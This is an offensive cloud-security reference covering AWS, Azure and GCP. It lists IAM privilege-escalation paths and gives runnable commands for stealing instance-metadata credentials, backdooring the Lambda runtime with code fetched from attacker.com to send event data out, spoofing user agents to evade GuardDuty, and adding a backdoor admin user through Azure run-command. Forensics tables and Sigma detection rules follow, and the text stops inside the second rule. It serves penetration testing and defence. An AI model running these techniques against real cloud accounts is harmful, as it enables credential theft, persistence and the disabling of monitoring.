# Cloud Attacks Deep Dive — AWS, Azure, GCP

> CIPHER Training Module — Multi-Cloud Offensive Security Reference
> Last updated: 2026-03-14
> Classification: Authorized Testing Only

---

## Table of Contents

1. [AWS IAM Privilege Escalation (40+ Paths)](#1-aws-iam-privilege-escalation)
2. [AWS S3 Exploitation](#2-aws-s3-exploitation)
3. [AWS EC2 IMDS Exploitation](#3-aws-ec2-imds-exploitation)
4. [AWS Lambda Persistence](#4-aws-lambda-persistence)
5. [AWS Post-Exploitation](#5-aws-post-exploitation)
6. [AWS Detection Evasion](#6-aws-detection-evasion)
7. [AWS Connection Tracking Abuse](#7-aws-connection-tracking-abuse)
8. [Azure Attack Paths](#8-azure-attack-paths)
9. [GCP Exploitation](#9-gcp-exploitation)
10. [Cloud Forensics Artifacts](#10-cloud-forensics-artifacts)
11. [Cloud-Specific Detection Rules](#11-cloud-specific-detection-rules)
12. [Tooling Reference](#12-tooling-reference)

---

## 1. AWS IAM Privilege Escalation

**Reference**: Spencer Gietzen / Rhino Security Labs, BishopFox, Nick Frichette
**ATT&CK**: T1078.004 (Cloud Accounts), T1098 (Account Manipulation), T1484 (Domain Policy Modification)

### 1.1 Direct Policy Manipulation

These require only a single IAM permission — no `iam:PassRole` needed.

| # | Technique | Required Permission(s) | Description |
|---|-----------|----------------------|-------------|
| 1 | Attach Admin to User | `iam:AttachUserPolicy` | Attach `AdministratorAccess` managed policy to controlled user |
| 2 | Attach Admin to Role | `iam:AttachRolePolicy` | Attach privileged managed policy to assumable role |
| 3 | Attach Admin to Group | `iam:AttachGroupPolicy` | Attach managed policy to group attacker belongs to |
| 4 | Put Inline User Policy | `iam:PutUserPolicy` | Create inline policy on user granting `*:*` |
| 5 | Put Inline Role Policy | `iam:PutRolePolicy` | Create inline policy on role granting admin |
| 6 | Put Inline Group Policy | `iam:PutGroupPolicy` | Create inline policy on group granting admin |
| 7 | Create Policy Version | `iam:CreatePolicyVersion` | Create new version of existing customer-managed policy with `*:*`, set as default |
| 8 | Set Default Policy Version | `iam:SetDefaultPolicyVersion` | Revert managed policy to prior version with broader permissions |
| 9 | Add User to Group | `iam:AddUserToGroup` | Add controlled user to existing privileged group |
| 10 | Create Access Key | `iam:CreateAccessKey` | Generate new access key pair for higher-privileged user |
| 11 | Create Login Profile | `iam:CreateLoginProfile` | Create console password for user without one |
| 12 | Update Login Profile | `iam:UpdateLoginProfile` | Change console password of existing user |
| 13 | Update Assume Role Policy | `iam:UpdateAssumeRolePolicy` | Modify trust policy to allow attacker principal to assume role |
| 14 | Delete Role Permissions Boundary | `iam:DeleteRolePermissionsBoundary` | Remove permissions boundary, expanding effective permissions |
| 15 | Delete User Permissions Boundary | `iam:DeleteUserPermissionsBoundary` | Remove user permissions boundary |
| 16 | Put Role Permissions Boundary | `iam:PutRolePermissionsBoundary` | Replace boundary with permissive one |
| 17 | Put User Permissions Boundary | `iam:PutUserPermissionsBoundary` | Replace user boundary with permissive one |
| 18 | Delete Role Policy (Deny Removal) | `iam:DeleteRolePolicy` | Delete inline deny policies to unlock broader access |
| 19 | Delete User Policy (Deny Removal) | `iam:DeleteUserPolicy` | Delete inline deny policies on user |
| 20 | Detach Role Policy (Deny Removal) | `iam:DetachRolePolicy` | Detach managed deny policies from role |
| 21 | Detach User Policy (Deny Removal) | `iam:DetachUserPolicy` | Detach managed deny policies from user |

### 1.2 PassRole + Service Exploitation

These require `iam:PassRole` combined with service-specific permissions to execute code under a privileged role.

| # | Technique | Required Permission(s) | Description |
|---|-----------|----------------------|-------------|
| 22 | Lambda Create + Invoke | `iam:PassRole`, `lambda:CreateFunction`, `lambda:InvokeFunction` | Create Lambda with privileged role, invoke to execute arbitrary code |
| 23 | Lambda Create + Event Source | `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping` | Trigger Lambda via DynamoDB/SQS event source |
| 24 | Lambda Create + AddPermission | `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission` | Create Lambda, grant cross-account invoke |
| 25 | EC2 RunInstances | `iam:PassRole`, `ec2:RunInstances` | Launch EC2 with privileged instance profile, exfiltrate creds via user data |
| 26 | CloudFormation CreateStack | `iam:PassRole`, `cloudformation:CreateStack` | Create CFN stack assuming privileged role |
| 27 | Glue CreateDevEndpoint | `iam:PassRole`, `glue:CreateDevEndpoint` | Create Glue dev endpoint with elevated role, SSH in |
| 28 | Glue CreateJob | `iam:PassRole`, `glue:CreateJob` | Create Glue ETL job with privileged role |
| 29 | Glue UpdateJob | `iam:PassRole`, `glue:UpdateJob` | Modify existing Glue job to use elevated role |
| 30 | Data Pipeline | `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, `datapipeline:ActivatePipeline` | Create pipeline executing commands under privileged role |
| 31 | ECS RunTask | `iam:PassRole`, `ecs:RunTask` | Launch Fargate task with privileged task role |
| 32 | ECS StartTask | `iam:PassRole`, `ecs:StartTask`, `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance` | Register to cluster, start privileged task |
| 33 | AutoScaling + LaunchConfig | `iam:PassRole`, `autoscaling:CreateAutoScalingGroup`, `autoscaling:CreateLaunchConfiguration` | ASG with privileged launch config |
| 34 | AutoScaling + LaunchTemplate | `iam:PassRole`, `autoscaling:CreateAutoScalingGroup`, `ec2:CreateLaunchTemplate` | ASG with privileged launch template |
| 35 | CodeStar CreateProject | `iam:PassRole`, `codestar:CreateProject` | Create CodeStar project with privileged role |
| 36 | Bedrock Code Interpreter | `iam:PassRole`, `bedrock-agentcore:CreateCodeInterpreter`, `bedrock-agentcore:InvokeCodeInterpreter` | Execute arbitrary code via Bedrock |

### 1.3 Service-Specific Escalation (No PassRole)

| # | Technique | Required Permission(s) | Description |
|---|-----------|----------------------|-------------|
| 37 | Lambda UpdateFunctionCode | `lambda:UpdateFunctionCode` | Replace Lambda code to execute under its existing role |
| 38 | Lambda UpdateFunctionConfiguration | `lambda:UpdateFunctionConfiguration` | Add malicious Lambda Layer to override runtime libraries |
| 39 | Glue UpdateDevEndpoint | `glue:UpdateDevEndpoint` | Inject SSH key into existing Glue dev endpoint |
| 40 | CodeStar Associate Team Member | `codestar:CreateProject`, `codestar:AssociateTeamMember` | Create project, add self as Owner |

### 1.4 Advanced Escalation Paths

**Cognito Identity Pool Abuse**
```bash
# Get identity from Cognito
aws cognito-identity get-id \
  --identity-pool-id <pool-id> \
  --account-id <account-id> \
  --logins cognito-idp.<region>.amazonaws.com/<user-pool-id>=<id-token>

# Exchange for AWS credentials
aws cognito-identity get-credentials-for-identity \
  --identity-id <identity-id> \
  --logins cognito-idp.<region>.amazonaws.com/<user-pool-id>=<id-token>
```
If the Identity Pool IAM role has excessive permissions, temporary credentials grant unintended access. [CONFIRMED]

**ACM-PCA + Route53 API Hijacking**
- Requires: `route53:CreateHostedZone`, `route53:ChangeResourceRecordSets`, `acm-pca:IssueCertificate`, `acm-pca:GetCertificate`
- AWS SDKs do NOT use certificate pinning
- Create private hosted zone for AWS API domain (e.g., `secretsmanager.us-east-1.amazonaws.com`)
- Issue cert from existing ACM-PCA with API domain as CN
- Deploy TLS listener to intercept and relay API calls
- Effectively MitM any AWS service within the VPC [CONFIRMED]

**Misconfigured Resource-Based Policies**
- Wildcard principal (`"*"`) on S3/SQS/SNS/Lambda grants public access
- `NotPrincipal` + `Allow` = all entities including cross-account get access
- `NotAction` + `Allow` = all actions except specified are permitted
- Within same account, resource-based Allow overrides identity-based implicit Deny [CONFIRMED]

---

## 2. AWS S3 Exploitation

**ATT&CK**: T1530 (Data from Cloud Storage), T1537 (Transfer Data to Cloud Account)

### 2.1 Bucket Enumeration & Account ID Discovery

```bash
# Install s3-account-search
pip install s3-account-search

# Enumerate account ID from public bucket (requires IAM role with s3:GetObject)
s3-account-search arn:aws:iam::123456789123:role/s3-searcher target-bucket-name
```
Exploits `s3:ResourceAccount` condition key wildcard support to brute-force account ID digit by digit. [CONFIRMED]

### 2.2 S3 ACL Persistence

With `s3:PutBucketAcl`, `s3:PutObjectAcl`, or `s3:PutObjectVersionAcl`:
- Grant READ/WRITE to attacker-controlled AWS account
- Grant to "Authenticated Users" group (any AWS principal in any account)
- Grant to "AllUsers" (anonymous, public internet)

**Limitations**:
- Bucket Public Access Block prevents public ACLs (but not cross-account sharing to specific accounts)
- ACLs disabled by default on new buckets since April 2023

**High-value S3 targets**: Terraform state files, CloudFormation templates, SSM scripts, application source code, CI/CD artifacts.

### 2.3 Data Exfiltration via S3 Server Access Logs

When direct access is denied, abuse logging to exfiltrate data:
1. Control a bucket with server access logging enabled to your logging bucket
2. Send `GetObject` requests to target bucket, encoding data in key name or User-Agent
3. Even failed requests (403) log the request parameters to your logging bucket
4. Retrieve exfiltrated data from logs

```
# Log entry format shows encoded data
REST.GET.OBJECT ExfiltratatedDataHere "GET /ExfiltratedDataHere HTTP/1.1" 403
```

**Constraints**: Key max 1024 bytes/request; 10-120 min log delivery delay; unordered delivery. [CONFIRMED]

### 2.4 CloudFront/DNS Takeover via Deleted S3 Buckets

- Discover orphaned CloudFront distributions or DNS records pointing to deleted S3 buckets
- Create bucket with same name in attacker account
- Serve malicious content through victim's domain/distribution
- **Mitigation**: Delete DNS records BEFORE deleting S3 buckets
- As of late 2023, AWS returns `NotFound` without bucket name for orphaned CloudFront distributions [CONFIRMED]

---

## 3. AWS EC2 IMDS Exploitation

**ATT&CK**: T1552.005 (Cloud Instance Metadata API), T1190 (Exploit Public-Facing Application)

### 3.1 IMDSv1 Credential Theft via SSRF

```bash
# Step 1: Verify IAM role exists
curl http://169.254.169.254/latest/meta-data/iam/
# 404 = no role; 200 = role present

# Step 2: Get role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: ec2-default-ssm

# Step 3: Extract credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm
# Returns JSON: AccessKeyId, SecretAccessKey, Token, Expiration
```

### 3.2 IMDSv2 Token-Based Access

```bash
# Requires PUT request first (blocks simple SSRF)
TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Then use token in subsequent requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**IMDSv2 protections**:
- Requires PUT to get token (most SSRF only sends GET)
- Token has TTL (max 6 hours)
- `X-Forwarded-For` header blocks token issuance (prevents proxy-based SSRF)
- **BUT**: code execution on the instance bypasses all IMDSv2 protections [CONFIRMED]

### 3.3 Key Metadata Endpoints

| Endpoint | Data |
|----------|------|
| `/latest/meta-data/iam/security-credentials/` | IAM role credentials |
| `/latest/meta-data/instance-id` | Instance ID |
| `/latest/meta-data/local-ipv4` | Private IP |
| `/latest/meta-data/public-ipv4` | Public IP |
| `/latest/meta-data/network/interfaces/macs/` | Network interfaces |
| `/latest/user-data` | User data scripts (may contain secrets) |
| `/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance` | EC2 instance identity credentials |

### 3.4 CloudShell Metadata (Port 1338)

```bash
# CloudShell uses port 1338 instead of standard 169.254.169.254
TOKEN=$(curl -X PUT localhost:1338/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials \
  -H "X-aws-ec2-metadata-token: $TOKEN"

# Or via boto3
python3 -c "import boto3; c=boto3.Session().get_credentials(); print(c.access_key, c.secret_key, c.token)"
```

### 3.5 Console Credential Extraction

AWS Console fetches service-scoped temporary credentials from:
```
https://{region}.console.aws.amazon.com/{service}/tb/creds
# Example:
https://us-east-1.console.aws.amazon.com/s3/tb/creds
https://us-east-1.console.aws.amazon.com/ec2/tb/creds
```
Returns JSON with `accessKeyId`, `secretAccessKey`, `sessionToken`. Use DevTools Network tab to intercept, or the CLIer browser extension. [CONFIRMED]

---

## 4. AWS Lambda Persistence

**ATT&CK**: T1546 (Event Triggered Execution), T1059 (Command and Scripting Interpreter)

### 4.1 Python Runtime Backdoor

Modify `/var/runtime/bootstrap.py` to intercept all subsequent invocations:

```bash
# From RCE on Lambda, download backdoored bootstrap
curl -o /tmp/bootstrap.py https://attacker.com/backdoor_bootstrap.py

# Get current request ID from Runtime API
RID=$(curl -s http://127.0.0.1:9001/2018-06-01/runtime/invocation/next | jq -r '.requestId // empty')

# Terminate current event
curl -X POST \
  "http://127.0.0.1:9001/2018-06-01/runtime/invocation/${RID}/response" \
  -d '{"statusCode": 200}'

# Execute backdoored bootstrap
python3 /tmp/bootstrap.py
```

The backdoored bootstrap exfiltrates all subsequent event data (credentials, cookies, user data) to attacker-controlled infrastructure. [CONFIRMED]

### 4.2 Ruby Runtime Backdoor

```bash
# Symlink runtime files to /tmp for modification
ln -s /var/runtime/lib/* /tmp/
# Download modified runtime
curl -o /tmp/run.rb https://attacker.com/backdoor_runtime.rb
# Terminate current event via Runtime API
# Execute: ruby /tmp/run.rb
```

### 4.3 Layer Injection

With `lambda:UpdateFunctionConfiguration`:
- Add malicious Lambda Layer that overrides standard library modules
- Layer code executes before function code on every invocation
- Enables persistent credential interception without modifying function source

### 4.4 Persistence Limitations

- **Cold start eviction**: Lambda execution environments are recycled after 5-15 minutes of inactivity
- **Warm keeping**: Must continuously invoke function to maintain persistence
- **Recovery**: Requires re-exploitation after cold start [CONFIRMED]

### 4.5 Exfiltration Infrastructure

Set up Nginx with custom logging to receive POST data:
```nginx
location /leak {
    access_log /var/log/nginx/postdata.log postdata;
    return 200;
}
```

---

## 5. AWS Post-Exploitation

**ATT&CK**: T1098 (Account Manipulation), T1136 (Create Account), T1078.004 (Cloud Accounts)

### 5.1 IAM Persistence Mechanisms

| Technique | Permissions Required | Stealth |
|-----------|---------------------|---------|
| Create IAM Access Keys | `iam:CreateAccessKey` | Low — keys don't expire by default |
| Create Login Profile | `iam:CreateLoginProfile` | Low — console access for any user |
| Modify Trust Policy | `iam:UpdateAssumeRolePolicy` | Medium — cross-account access |
| OIDC Identity Provider | `iam:CreateOpenIDConnectProvider` | High — external IdP trust |
| IAM Roles Anywhere | `iam:CreateRole`, `rolesanywhere:*` | High — X.509 cert-based access |
| S3 ACL Backdoor | `s3:PutBucketAcl` | High — no IAM trail for data access |
| Eventual Consistency | Varies | High — exploits IAM propagation delay |

### 5.2 EC2 Shell Command Execution via SSM

```bash
# Primary method — commands hidden from CloudTrail by default
aws ssm send-command \
  --instance-ids "i-00000000000000000" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="id; cat /etc/shadow"

# Retrieve output
aws ssm list-command-invocations \
  --command-id "<command-id>" \
  --details

# Interactive session
aws ssm start-session --target i-00000000000000000
```

**Key fact**: SSM SendCommand parameters are logged as `HIDDEN_DUE_TO_SECURITY_REASONS` in CloudTrail. [CONFIRMED]

### 5.3 Alternative SSM Documents (Evasion)

When `AWS-RunShellScript` is blocked by SCP or detection:

| Document | Source | Notes |
|----------|--------|-------|
| `AWS-RunSaltState` | S3, HTTPS | Requires SaltStack |
| `AWS-ApplyAnsiblePlaybooks` | GitHub, S3 | Auto-installs Ansible |
| `AWS-RunAnsiblePlaybook` | S3, HTTPS | Requires pre-installed Ansible |
| `AWS-InstallPowerShellModule` | HTTPS | Executes post-install commands |
| `AWS-InstallApplication` | HTTPS | Downloads/installs MSI |
| `AWS-RunRemoteScript` | S3, GitHub | Cross-platform |
| `AWS-RunDocument` | S3, GitHub, HTTPS | Meta-document: runs other SSM docs |

**Tool**: EC2StepShell — upgrades SSM command execution to interactive shell.

### 5.4 SSM Communication Interception

With access to an EC2 instance or valid IAM credentials:
- **Message interception**: Rapidly poll SSM API to receive messages before legitimate agent
- **Session hijacking**: Create rogue WebSocket control channel to intercept incoming SSM sessions
- **Tool**: [ssm-agent-research](https://github.com/Frichetten/ssm-agent-research) (PoC)

### 5.5 EC2 User Data Script Persistence

**Method 1 — Direct modification** (requires `ec2:ModifyInstanceAttribute`):
- Instance must be stopped before modification
- Wait for natural reboot, or stop/start if permissions allow
- Scripts execute as root/System on boot

**Method 2 — Indirect modification**:
- If user data script fetches from S3/HTTP, compromise the source
- No instance modification needed

### 5.6 Console Session from IAM Credentials

**From temporary credentials (ASIA...)**: Use `aws-vault login` directly.
**From long-term credentials (AKIA...)**: First call `aws sts get-federation-token`, then `aws-vault login`.

**Warning**: Generates `ConsoleLogin` CloudTrail event — not stealthy. [CONFIRMED]

---

## 6. AWS Detection Evasion

**ATT&CK**: T1562.008 (Disable Cloud Logs), T1070 (Indicator Removal)

### 6.1 GuardDuty Evasion

**User-Agent Spoofing** (avoids pentest distribution detection):
```bash
# Route AWS CLI through Burp Suite proxy
export HTTPS_PROXY=http://127.0.0.1:8080
export HTTP_PROXY=http://127.0.0.1:8080

# Configure Burp match-and-replace:
# Match: ^User-Agent.*$  (regex)
# Replace: User-Agent: aws-sdk-python/1.0.0
```
GuardDuty flags User-Agents from Kali, ParrotOS, Pentoo. Spoofing prevents these alerts. [CONFIRMED]

**VPC Endpoint Credential Laundering**:
- Use stolen EC2 credentials from your own EC2 instance routed through VPC Endpoints
- Bypasses `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- **Tool**: SneakyEndpoints (Terraform-automated VPC endpoint setup)
- **Caveat**: As of October 2024, GuardDuty expanded detection to cover VPC endpoint abuse for 26+ services [CONFIRMED]

**Same-Account Credential Reuse**:
- GuardDuty `InsideAWS` finding only triggers when credentials are used from a different account
- Using stolen creds from another EC2 in the same account does NOT trigger the finding

### 6.2 GuardDuty Configuration Manipulation

| Technique | Permission | Effect |
|-----------|-----------|--------|
| Disable detector | `guardduty:UpdateDetector` | Stops all detection |
| Remove data sources | `guardduty:UpdateDetector` | Disable S3/K8s monitoring |
| Increase publishing frequency | `guardduty:UpdateDetector` | Delay alerts from 15min to 6hrs |
| Add trusted IP list | `guardduty:CreateIPSet`, `guardduty:UpdateIPSet` | Whitelist attacker IPs (CloudTrail+VPC findings, NOT DNS) |
| Create suppression rules | `guardduty:CreateFilter` | Auto-archive specific finding types |
| Delete publishing destination | `guardduty:DeletePublishingDestination` | Break alert delivery pipeline |
| Disrupt CloudWatch Events | `events:PutRule`, `events:RemoveTargets` | Break automated remediation |

**Architecture note**: In delegated admin model, detector/IP list changes require admin account access. Member account CloudWatch events remain independently vulnerable.

### 6.3 CloudTrail Evasion

**Non-logged API calls**:
- SSM SendCommand parameters: `HIDDEN_DUE_TO_SECURITY_REASONS`
- Some data-plane operations not logged by default
- S3 object-level operations require explicit data event logging

**Event Selector Manipulation** (requires `cloudtrail:PutEventSelectors`):
- Modify trail to exclude specific event types
- Remove data event logging for S3/Lambda
- Reduce management event scope

### 6.4 Region-Based Evasion

- Operate in regions where CloudTrail/GuardDuty are not enabled
- Many organizations only enable monitoring in regions they actively use
- Check trail configuration: trails may not be multi-region

---

## 7. AWS Connection Tracking Abuse

**ATT&CK**: T1205 (Traffic Signaling), T1071 (Application Layer Protocol)

Security Groups are stateful — they track connections bidirectionally. Established connections persist even after SG rule changes.

**Exploitation chain**:
1. Gain command execution on EC2 instance
2. Establish reverse shell / C2 channel (outbound connection)
3. Defender modifies Security Group to block all traffic
4. **Connection tracking keeps established session alive**
5. Attacker maintains access despite "isolation"

**Limitation**: Beaconing C2 that creates new connections will fail. Only existing bidirectional connections persist.

**Implication**: Incident responders must terminate the instance (not just modify SGs) to ensure containment. [CONFIRMED]

---

## 8. Azure Attack Paths

**ATT&CK**: T1078.004, T1528 (Steal Application Access Token), T1098.001

### 8.1 Managed Identity Token Theft

```bash
# From compromised Azure compute resource (VM, App Service, Function, etc.)
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" \
  -H secret:$IDENTITY_HEADER
# Returns: access_token, client_id, expires_on

# Use token with Az PowerShell
Connect-AzAccount -AccessToken <token> -AccountId <client_id>

# Enumerate accessible resources
Get-AzResource

# Extract storage account keys
Get-AzStorageAccountKey -ResourceGroupName "RG" -AccountName "StorageAcct"
```

**Attack chain**: Compromised compute -> managed identity token -> Azure auth -> resource enumeration -> key extraction -> lateral movement beyond intended scope. [CONFIRMED]

### 8.2 Azure AD / Entra ID Attack Paths

**Azure AD Connect Exploitation**:
- Azure AD Connect syncs on-prem AD with Entra ID
- Credentials stored locally on the sync server
- Extract sync credentials for domain-wide access

**Password Spray via Email Enumeration**:
- Tools: CredMaster, Quiet Riot
- Enumerate valid Entra ID email addresses
- Cross-platform: same emails may be AWS root user accounts
- Use enumerated addresses for password spraying campaigns

**Token Manipulation (ROADtx)**:
- Multiple Azure AD auth flow exploitation
- Device registration operations
- PRT (Primary Refresh Token) theft and abuse
- Token exchange between different token types

### 8.3 Azure Anonymous Blob Access

```bash
# Enumerate publicly accessible containers
# Using MicroBurst PowerShell module with wordlist

# Manual check — append to container URL:
curl "https://<storage_account>.blob.core.windows.net/<container>?restype=container&comp=list"
# Returns XML listing all blobs with URLs, sizes, timestamps
```

**Access levels**:
- **Private**: No anonymous access
- **Blob**: Anonymous access requires full URL (must know blob name)
- **Container**: Anonymous access + directory listing (critical misconfiguration)

No credentials needed for misconfigured containers. [CONFIRMED]

### 8.4 Azure Run Command Abuse

```powershell
# Execute commands as SYSTEM (Windows) or root (Linux)
# Requires: Microsoft.Compute/virtualMachines/runCommands/action

# Example: Create backdoor admin user
az vm run-command invoke \
  --resource-group MyRG \
  --name MyVM \
  --command-id RunShellScript \
  --scripts "net user /add backdoor BingoBango123! && net localgroup administrators backdoor /add"
```

**Detection**: Monitor for `Microsoft.Compute/virtualMachines/runCommand/action` in Activity Log.

### 8.5 Azure RBAC Escalation Paths

| Path | Description |
|------|-------------|
| User Access Administrator | Can assign any role to any principal |
| Owner role | Full resource control + role assignment |
| Contributor + Key Vault access | Read secrets, certificates, keys |
| Automation Account Contributor | Run runbooks as Automation identity |
| Logic App Contributor | Execute workflows with managed identity |
| Website Contributor | Access App Service managed identity |

### 8.6 Key Azure Tools

| Tool | Purpose |
|------|---------|
| **PowerZure** | Azure/Entra ID exploitation — user/role analysis, token generation, resource targeting |
| **ROADtools** (ROADrecon + ROADtx) | Azure AD enumeration, offline DB analysis, token manipulation |
| **MicroBurst** | Azure security assessment — storage enumeration, VM analysis |
| **AzureHound** | BloodHound data collection for Azure attack path analysis |

---

## 9. GCP Exploitation

**ATT&CK**: T1078.004, T1552.005, T1098

### 9.1 GCP IAM Privilege Escalation (23+ Paths)

| # | Permission | Technique |
|---|-----------|-----------|
| 1 | `iam.roles.update` | Modify custom role to add arbitrary permissions |
| 2 | `iam.serviceAccountKeys.create` | Create key for higher-privileged service account |
| 3 | `iam.serviceAccounts.getAccessToken` | Generate access token for privileged SA |
| 4 | `iam.serviceAccounts.implicitDelegation` | Chain SA impersonation across delegation |
| 5 | `iam.serviceAccounts.signBlob` | Sign arbitrary blobs as SA (forge tokens) |
| 6 | `iam.serviceAccounts.signJwt` | Sign JWTs as SA (forge access tokens) |
| 7 | `orgpolicy.policy.set` | Modify org policies to remove restrictions |
| 8 | `compute.instances.create` | Launch VM with privileged SA |
| 9 | `cloudfunctions.functions.create` | Deploy Cloud Function with privileged SA |
| 10 | `cloudfunctions.functions.update` | Modify existing function's SA or code |
| 11 | `cloudbuilds.builds.create` | Submit Cloud Build with elevated permissions |
| 12 | `run.services.create` | Deploy Cloud Run service with privileged SA |
| 13 | `deploymentmanager.deployments.create` | Create deployment with arbitrary resources |
| 14 | `cloudscheduler.jobs.create` | Schedule jobs as privileged SA |
| 15 | `composer.environments.get` | Access Composer/Airflow environment secrets |
| 16 | `dataflow.jobs.create` | Create Dataflow job with elevated SA |
| 17 | `dataflow.jobs.update` | Modify Dataflow job SA |
| 18 | `dataproc.clusters.create` | Create Dataproc cluster with privileged SA |
| 19 | `dataproc.jobs.create` | Submit Dataproc job with elevated permissions |
| 20 | `dataproc.jobs.update` | Modify Dataproc job |
| 21 | `serviceusage.apiKeys.create` | Create API keys for enabled services |
| 22 | `serviceusage.apiKeys.list` | List existing API keys |
| 23 | `storage.hmacKeys.create` | Create HMAC keys for SA storage access |

**Reference**: Rhino Security Labs GCP IAM privilege escalation research. [CONFIRMED]

### 9.2 GCP Metadata Server Exploitation

```bash
# GCP metadata server (similar to AWS IMDS)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get service account email
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# Get project ID
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id

# List available scopes
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes

# Get instance attributes (may contain secrets)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/
```

**Key difference from AWS**: GCP requires `Metadata-Flavor: Google` header (like IMDSv2 concept) but it's a simple GET header, not a PUT-then-GET flow — still exploitable via many SSRF vectors. [CONFIRMED]

### 9.3 GCS Bucket Exploitation

**GCPBucketBrute**:
```bash
# Enumerate buckets from keyword
python3 gcpbucketbrute.py -k company-name -s 10

# Check specific bucket permissions
python3 gcpbucketbrute.py --check bucket-name

# Batch check from file
python3 gcpbucketbrute.py --check-list buckets.txt

# Auth modes: service account key, access token, or unauthenticated
python3 gcpbucketbrute.py -k keyword -f sa-key.json
```

**Permission escalation**: If `storage.buckets.setIamPolicy` is available on a bucket, grant yourself full access. [CONFIRMED]

### 9.4 GCP-Specific Attack Scenarios

| Scenario | Description |
|----------|-------------|
| Default SA abuse | Default Compute SA has `editor` role — over-privileged by default |
| GKE pod SA token | Pods mount SA tokens at `/var/run/secrets/google/...` |
| Cloud Function env vars | Secrets often stored in environment variables |
| Firestore/Datastore access | Often misconfigured with public read |
| Cloud SQL proxy abuse | Stolen SA key enables direct database access |

### 9.5 GCP Training Lab

**GCP Goat** — vulnerable-by-design GCP environment:
- Attacking Compute Engine
- Attacking SQL Instance
- Attacking GKE
- Attacking GCS
- Privilege Escalation
- Privilege Escalation in Compute Engine
- URL: https://gcpgoat.joshuajebaraj.com/

---

## 10. Cloud Forensics Artifacts

### 10.1 AWS Forensics Sources

| Source | Location | Contains |
|--------|----------|----------|
| **CloudTrail** | S3 bucket / CloudWatch Logs | API calls, source IP, user agent, request params |
| **CloudTrail Lake** | AWS-managed | SQL-queryable event store |
| **VPC Flow Logs** | S3 / CloudWatch | Network flow metadata (no payload) |
| **GuardDuty Findings** | Console / S3 export | Threat detection with severity |
| **S3 Access Logs** | S3 bucket | Object-level access records |
| **ELB Access Logs** | S3 bucket | HTTP request logs |
| **Route53 DNS Logs** | CloudWatch Logs | DNS query logs |
| **RDS Audit Logs** | CloudWatch Logs | Database query audit |
| **EC2 Instance Metadata** | Instance | Runtime config, user data |
| **SSM Run Command History** | Console / API | Command execution records (params hidden) |
| **IAM Credential Report** | `iam:GenerateCredentialReport` | All users, key ages, MFA status |
| **IAM Access Advisor** | `iam:GenerateServiceLastAccessedDetails` | Last access timestamps per service |
| **Config Recorder** | AWS Config | Resource configuration history |

**Critical gap**: SSM SendCommand parameters are `HIDDEN_DUE_TO_SECURITY_REASONS` in CloudTrail — commands executed via SSM have limited forensic visibility.

### 10.2 Azure Forensics Sources

| Source | Contains |
|--------|----------|
| **Activity Log** | Control plane operations (90-day retention) |
| **Entra ID Sign-in Logs** | Authentication events, conditional access |
| **Entra ID Audit Logs** | Directory changes, role assignments |
| **NSG Flow Logs** | Network flow metadata |
| **Diagnostic Logs** | Per-resource operational logs |
| **Azure Monitor** | Metrics and alerts |
| **Key Vault Audit Logs** | Secret/key/cert access |
| **Storage Analytics Logs** | Blob/Table/Queue access |
| **Microsoft Defender for Cloud** | Security recommendations, alerts |

### 10.3 GCP Forensics Sources

| Source | Contains |
|--------|----------|
| **Cloud Audit Logs (Admin Activity)** | Always-on, control plane ops |
| **Cloud Audit Logs (Data Access)** | Must be enabled, data plane ops |
| **VPC Flow Logs** | Network flow metadata |
| **Cloud DNS Logs** | DNS query logs |
| **Access Transparency Logs** | Google staff access to your data |
| **Cloud Logging** | Centralized log aggregation |
| **Security Command Center** | Security findings, vulnerability scanning |

---

## 11. Cloud-Specific Detection Rules

### 11.1 AWS — IAM Privilege Escalation Attempt

```yaml
title: AWS IAM Policy Modification for Privilege Escalation
id: a3f2c8d1-7e4b-4f9a-b5c6-8d2e1f3a4b5c
status: experimental
description: Detects IAM policy modifications commonly used in privilege escalation chains
logsource:
  product: aws
  service: cloudtrail
detection:
  selection_policy_mod:
    eventName:
      - PutUserPolicy
      - PutRolePolicy
      - PutGroupPolicy
      - AttachUserPolicy
      - AttachRolePolicy
      - AttachGroupPolicy
      - CreatePolicyVersion
      - SetDefaultPolicyVersion
  selection_boundary_removal:
    eventName:
      - DeleteUserPermissionsBoundary
      - DeleteRolePermissionsBoundary
  selection_trust_mod:
    eventName:
      - UpdateAssumeRolePolicy
  condition: selection_policy_mod or selection_boundary_removal or selection_trust_mod
falsepositives:
  - Infrastructure-as-code deployments (Terraform, CloudFormation)
  - Authorized IAM administrators during planned changes
level: high
tags:
  - attack.t1098
  - attack.privilege_escalation
  - attack.persistence
```

### 11.2 AWS — IMDS Credential Theft Indicator

```yaml
title: AWS EC2 Stolen IMDS Credentials Used Outside Instance
id: b4e3d9f2-8a5c-4e1b-a6d7-9c3f2e4b5a6d
status: experimental
description: Detects use of EC2 instance role credentials from unexpected source IPs indicating credential theft
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    userIdentity.type: AssumedRole
    userIdentity.arn|contains: ':assumed-role/'
  filter_expected:
    sourceIPAddress|endswith: '.amazonaws.com'
  condition: selection and not filter_expected
falsepositives:
